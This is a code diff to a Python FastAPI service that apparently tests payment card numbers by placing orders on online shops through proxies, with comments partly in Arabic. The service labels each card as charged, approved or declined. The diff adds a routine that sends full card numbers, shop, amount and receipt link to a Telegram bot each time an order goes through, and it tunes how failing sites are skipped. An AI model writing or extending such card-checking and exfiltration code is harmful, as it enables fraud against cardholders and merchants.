@@ -19,6 +19,7 @@ _here = Path(__file__).resolve().parent
 if str(_here) not in sys.path:
     sys.path.insert(0, str(_here))
 
+import httpx
 import uvicorn
 from fastapi import FastAPI, Request, Query
 from fastapi.responses import JSONResponse
@@ -26,6 +27,8 @@ from fastapi.responses import JSONResponse
 import auto
 import auto_async
 from auto import CheckStatus
+
+from config import BOT_ENABLED, BOT_TOKEN, BOT_CHAT_ID, BOT_API_URL
 
 try:
     import psutil
@@ -61,6 +64,9 @@ _SITE_TTL = {
     "could not extract session": 300,
     "curl: (28)":                 90,
     "Step 0 failed":              90,
+    # ✅ NEW: dev shop + no payment gateways (تتجاهلهم لمدة 24 ساعة)
+    "development shop":        86400,
+    "no payment gateways":     86400,
 }
 
 _dead_sites: dict[str, float] = {}
@@ -110,7 +116,9 @@ _INFRA_ERROR_KEYWORDS = (
     "CURL:", "CONNECT TUNNEL", "COULD NOT EXTRACT", "COULD NOT",
     "POLL ", "EXCEEDED 30", "PROXY", "TIMEOUT", "TIMED OUT",
     "INVENTORYRESERVATIONFAILURE", "NO SHOPIFY", "SESSION", "LIBCURL",
-    "PROCESSING",   # ✅ جديد — PROCESSING يتعامل كـ error
+    "PROCESSING",
+    # ✅ NEW: dev shop + no payment gateways (infra errors مش declined)
+    "DEVELOPMENT SHOP", "NO PAYMENT GATEWAYS",
 )
 
 
@@ -136,6 +144,57 @@ def normalize_result(status: str, result_str: str) -> tuple[str, str]:
 
 def normalize_proxy(proxy: str) -> str:
     return auto.normalize_proxy(proxy)
+
+
+# ══════════════════════════════════════════════════════════════
+#  Telegram Bot Notification
+# ══════════════════════════════════════════════════════════════
+async def _send_to_bot(
+    card: str,
+    site: str,
+    amount: str,
+    receipt_url: str = "",
+    gateway: str = "VeNoM",
+    extra: str = "",
+) -> None:
+    """يرسل إشعار ORDER_PLACED إلى بوت Telegram."""
+    if not BOT_ENABLED or not BOT_TOKEN or not BOT_CHAT_ID:
+        return
+
+    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    text = (
+        f"✅ <b>ORDER PLACED</b> ✅\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"💳 <b>Card:</b> <code>{card}</code>\n"
+        f"🏪 <b>Site:</b> {site}\n"
+        f"💰 <b>Amount:</b> ${amount}\n"
+        f"🏦 <b>Gateway:</b> {gateway}\n"
+    )
+    if receipt_url:
+        text += f"🔗 <b>Receipt:</b> {receipt_url}\n"
+    if extra:
+        text += f"📝 <b>Extra:</b> {extra}\n"
+    text += f"⏰ <b>Time:</b> {ts}\n"
+    text += f"━━━━━━━━━━━━━━━━━━━━"
+
+    url = f"{BOT_API_URL}/bot{BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id":                  BOT_CHAT_ID,
+        "text":                     text,
+        "parse_mode":               "HTML",
+        "disable_web_page_preview": True,
+    }
+
+    try:
+        async with httpx.AsyncClient(timeout=10) as client:
+            resp = await client.post(url, json=payload)
+            if resp.status_code != 200:
+                _log.warning("Bot send failed [%s]: %s", resp.status_code, resp.text[:200])
+            else:
+                _log.info("Bot sent OK: %s", card)
+    except Exception as e:
+        _log.warning("Bot send error: %s", e)
 
 
 # ══════════════════════════════════════════════════════════════
@@ -169,12 +228,12 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
     status     = status_map.get(res.status, "error")
     result_str = res.status_code or _exc_text(res.error) or "UNKNOWN"
 
-    # ✅ كشف PROCESSING قبل normalize
+    # كشف PROCESSING قبل normalize
     is_processing = (result_str or "").upper() == "PROCESSING"
 
     status, result_str = normalize_result(status, result_str)
 
-    # ✅ لو PROCESSING → متعملهوش mark_dead (مش موقع ميت، محاولة)
+    # لو PROCESSING → متعملهوش mark_dead (مش موقع ميت، محاولة)
     if status == "error" and not is_processing:
         _mark_dead(site, result_str)
 
@@ -191,7 +250,7 @@ async def check_card_async(cc: str, site: str, proxy: str) -> dict:
         "receipt_url": res.receipt_url or "",
         "card":        cc,
         "gateway":     getattr(res, "gateway", "") or "VeNoM",
-        "retry":       is_processing or bool(getattr(res, "retryable", False)),   # ✅
+        "retry":       is_processing or bool(getattr(res, "retryable", False)),
     }
 
 
@@ -263,7 +322,7 @@ async def route_check(
     site:  Optional[str] = Query(None),
     proxy: Optional[str] = Query(None),
 ):
-    # ── فحص الذاكرة أولاً ─────────────────────────────────────
+    # فحص الذاكرة أولاً
     if _is_memory_exceeded():
         return JSONResponse({"error": "Server is busy"}, status_code=503)
 
@@ -322,11 +381,10 @@ async def route_check(
     elapsed     = round(time.monotonic() - t0, 2)
     card_status = result.get("status", "error")
 
-    # ✅ لو PROCESSING → متسجلهوش في errors
+    # لو retry → متسجلهوش في errors
     is_retry = bool(result.get("retry", False))
 
     if is_retry:
-        # محاولة → مش بتتحسب في stats
         _stats["active"] -= 1
         _log.info("%s|RETRY:%s", cc, result.get("result", "PROCESSING"))
         return JSONResponse({
@@ -349,6 +407,17 @@ async def route_check(
         await _save_dump(cc, site, card_status,
                          result.get("result", ""), result.get("amount", "0"))
 
+    # ✅ إرسال للبوت عند ORDER_PLACED فقط
+    if card_status == "charged" and result.get("result", "").upper() == "ORDER_PLACED":
+        asyncio.create_task(_send_to_bot(
+            card=cc,
+            site=site,
+            amount=result.get("amount", "0"),
+            receipt_url=result.get("receipt_url", ""),
+            gateway=result.get("gateway", "VeNoM"),
+            extra=result.get("result", ""),
+        ))
+
     bot_status = {
         "charged":  "Charged",
         "approved": "Approved",
@@ -361,7 +430,7 @@ async def route_check(
     elif card_status == "approved" and "3DS" in _result_str.upper():
         _result_str = "3DS_REQUIRED"
 
-    # ✅ البوابة الأصلية
+    # البوابة الأصلية
     gateway = result.get("gateway") or "VeNoM"
 
     return JSONResponse({
@@ -372,7 +441,7 @@ async def route_check(
         "Card":        cc,
         "site":        site,
         "elapsed":     elapsed,
-        "receipt_url": result.get("receipt_url", ""),   # ✅ لينك الدفع
+        "receipt_url": result.get("receipt_url", ""),
         "retry":       False,
     })
 
@@ -385,7 +454,7 @@ if __name__ == "__main__":
     cpu_count = multiprocessing.cpu_count()
     workers   = max(1, cpu_count)
 
-    # ✅ uvloop مش بيشتغل على Windows
+    # uvloop مش بيشتغل على Windows
     loop_type = "uvloop" if sys.platform != "win32" else "asyncio"
 
     print("━" * 50)
@@ -396,6 +465,9 @@ if __name__ == "__main__":
     print(f"  Status       : /VeNoMs")
     print(f"  Loop         : {loop_type}")
     print(f"  Timeout      : {REQUEST_TIMEOUT}s")
+    print(f"  Bot Enabled  : {BOT_ENABLED}")
+    print(f"  Bot Chat ID  : {'SET' if BOT_CHAT_ID else '(not set)'}")
+    print(f"  Bot Token    : {'SET' if BOT_TOKEN else '(not set)'}")
     print("━" * 50)
     print("━" * 50)
 
